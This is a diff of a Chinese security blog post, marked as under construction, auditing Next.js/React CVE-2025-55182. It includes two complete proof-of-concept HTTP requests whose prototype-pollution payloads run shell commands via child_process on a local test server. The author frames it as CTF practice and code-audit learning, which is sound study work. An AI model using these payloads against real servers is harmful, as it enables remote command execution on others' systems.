@@ -17,19 +17,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>next.js之CVE-2025-55182代码审计 - Sauy's corner</title>
+  <title>施工ing-next.js之CVE-2025-55182代码审计 - Sauy's corner</title>
 
   
     <meta name="description" content="这洞最近经常出现在ctf考题，会在漏洞的基础上做waf，寒假很多比赛都遇到了，刚好想锻炼自己审计代码的能力，于是就打算写一个这这个洞的审计教程~ 漏洞介绍123https:&#x2F;&#x2F;react.dev&#x2F;blog&#x2F;2025&#x2F;12&#x2F;03&#x2F;critical-security-vulnerability-in-react-server-componentshttps:&#x2F;&#x2F;react2shell.com&#x2F;http">
 <meta property="og:type" content="article">
-<meta property="og:title" content="next.js之CVE-2025-55182代码审计">
+<meta property="og:title" content="施工ing-next.js之CVE-2025-55182代码审计">
 <meta property="og:url" content="http://example.com/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
 <meta property="og:site_name" content="Sauy&#39;s corner">
 <meta property="og:description" content="这洞最近经常出现在ctf考题，会在漏洞的基础上做waf，寒假很多比赛都遇到了，刚好想锻炼自己审计代码的能力，于是就打算写一个这这个洞的审计教程~ 漏洞介绍123https:&#x2F;&#x2F;react.dev&#x2F;blog&#x2F;2025&#x2F;12&#x2F;03&#x2F;critical-security-vulnerability-in-react-server-componentshttps:&#x2F;&#x2F;react2shell.com&#x2F;http">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/sauy.jpg">
 <meta property="article:published_time" content="2026-02-04T13:10:58.000Z">
-<meta property="article:modified_time" content="2026-02-03T09:17:46.990Z">
+<meta property="article:modified_time" content="2026-02-07T13:39:08.200Z">
 <meta property="article:author" content="Sauy">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary_large_image">
@@ -49,7 +49,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2026-02-04T21:10:58+08:00","dateModified":"2026-02-03T17:17:46+08:00","datePublished":"2026-02-04T21:10:58+08:00","description":"","headline":"next.js之CVE-2025-55182代码审计","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","keywords":"代码审计","thumbnailUrl":"/images/14.JPG","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2026-02-04T21:10:58+08:00","dateModified":"2026-02-07T21:39:08+08:00","datePublished":"2026-02-04T21:10:58+08:00","description":"","headline":"施工ing-next.js之CVE-2025-55182代码审计","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","keywords":"代码审计","thumbnailUrl":"/images/14.JPG","image":1}</script>
   
 </head>
 <body>
@@ -68,7 +68,7 @@
 
 
 
-<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/02/06/UniCTF2026/"><span class="title">UniCTF-WEB WP</span></a><a class="item title" href="/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="title">next.js之CVE-2025-55182代码审计</span></a><a class="item title" href="/2028/01/22/HTB-Practice/"><span class="title">HTB-wp-长期更新</span></a><a class="item title" href="/2025/12/18/SECCON%20CTF%2014%20Quals-%E5%A4%8D%E7%8E%B0/"><span class="title">SECCON CTF 14 Quals-broken-challenge</span></a><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2025/12/08/xpath-%E6%B3%A8%E5%85%A5/"><span class="title">BackdoorCTF2025之Trust Issues</span></a><a class="item title" href="/2025/12/04/HeroCTF%20v7-WEB/"><span class="title">HeroCTF v7-web</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a><a class="item title" href="/2025/04/27/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"><span class="title">CBC字节翻转攻击</span></a><a class="item title" href="/2025/11/11/%5B2025%5DN1CTF%20WP/"><span class="title">N1CTF2025-eezzjs</span></a></div></widget>
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2010/01/22/HTB-Practice/"><span class="title">HTB-wp-长期更新</span></a><a class="item title" href="/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="title">施工ing-next.js之CVE-2025-55182代码审计</span></a><a class="item title" href="/2026/02/06/UniCTF2026/"><span class="title">UniCTF-WEB WP</span></a><a class="item title" href="/2025/12/18/SECCON%20CTF%2014%20Quals-%E5%A4%8D%E7%8E%B0/"><span class="title">SECCON CTF 14 Quals-broken-challenge</span></a><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2025/12/08/xpath-%E6%B3%A8%E5%85%A5/"><span class="title">BackdoorCTF2025之Trust Issues</span></a><a class="item title" href="/2025/12/04/HeroCTF%20v7-WEB/"><span class="title">HeroCTF v7-web</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a><a class="item title" href="/2025/04/27/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"><span class="title">CBC字节翻转攻击</span></a><a class="item title" href="/2025/11/11/%5B2025%5DN1CTF%20WP/"><span class="title">N1CTF2025-eezzjs</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -81,12 +81,12 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-02-04T13:10:58.000Z">2026-02-04</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-02-03T09:17:46.990Z">2026-02-03</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-02-04T13:10:58.000Z">2026-02-04</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-02-07T13:39:08.200Z">2026-02-07</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>next.js之CVE-2025-55182代码审计</span></h1>
+        <h1 class="text title"><span>施工ing-next.js之CVE-2025-55182代码审计</span></h1>
         
       </div>
     </div>
@@ -101,7 +101,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br><span class="line">npm create next-app@16.0.5 react -y</span><br><span class="line">cd react</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>
 
 <p>出现这个界面就是安装成功了</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260203145954415.png" alt="image-20260203145954415"></p>
+<p><img src="/images/image-20260203145954415.png" alt="image-20260203145954415"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc1和poc2其实没什么区别 分别用的execSync和spawnSync</p>
 <p>poc-1</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Next-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0</span><br><span class="line">Content-Length: 691</span><br><span class="line">Content-Type: multipart/form-data; boundary=23b6c1590a28ba5570b0915d528827c4</span><br><span class="line"></span><br><span class="line">--23b6c1590a28ba5570b0915d528827c4</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;var res=encodeURIComponent(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString().trim());;throw Object.assign(new Error(&#x27;NEXT_REDIRECT&#x27;),&#123;digest: `NEXT_REDIRECT;push;/login?a=$&#123;res&#125;;307;`&#125;);&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:&#123;&quot;get&quot;:&quot;$1:constructor:constructor&quot;&#125;&#125;&#125;</span><br><span class="line">--23b6c1590a28ba5570b0915d528827c4</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">--23b6c1590a28ba5570b0915d528827c4</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">--23b6c1590a28ba5570b0915d528827c4--</span><br></pre></td></tr></table></figure>
@@ -110,7 +110,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Next-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0</span><br><span class="line">Content-Length: 719</span><br><span class="line">Content-Type: multipart/form-data; boundary=c08d154aee2e180c61d30ba1cebce34f</span><br><span class="line"></span><br><span class="line">--c08d154aee2e180c61d30ba1cebce34f</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;var r=process.mainModule.require(&#x27;child_process&#x27;).spawnSync(&#x27;whoami&#x27;,&#123;encoding:&#x27;utf8&#x27;,timeout:5000&#125;);var res=r.stdout||r.stderr||&#x27;&#x27;;throw Object.assign(new Error(&#x27;NEXT_REDIRECT&#x27;),&#123;digest:`NEXT_REDIRECT;push;/login?a=$&#123;res.trim()&#125;;307;`&#125;);&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:&#123;&quot;get&quot;:&quot;$1:constructor:constructor&quot;&#125;&#125;&#125;</span><br><span class="line">--c08d154aee2e180c61d30ba1cebce34f</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">--c08d154aee2e180c61d30ba1cebce34f</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">--c08d154aee2e180c61d30ba1cebce34f--</span><br></pre></td></tr></table></figure>
 
 <p>命令回显均可在回显头里看到</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260203154505105.png" alt="image-20260203154505105"></p>
+<p><img src="/images/image-20260203154505105.png" alt="image-20260203154505105"></p>
 </article>
 <div class="article-footer">
     <section id="license">
